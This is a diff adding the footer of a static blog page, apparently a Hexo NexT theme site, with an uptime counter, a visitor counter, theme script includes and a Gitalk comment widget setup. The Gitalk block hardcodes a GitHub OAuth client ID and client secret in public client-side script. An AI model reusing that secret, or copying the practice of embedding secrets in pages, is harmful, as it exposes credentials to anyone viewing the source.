+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
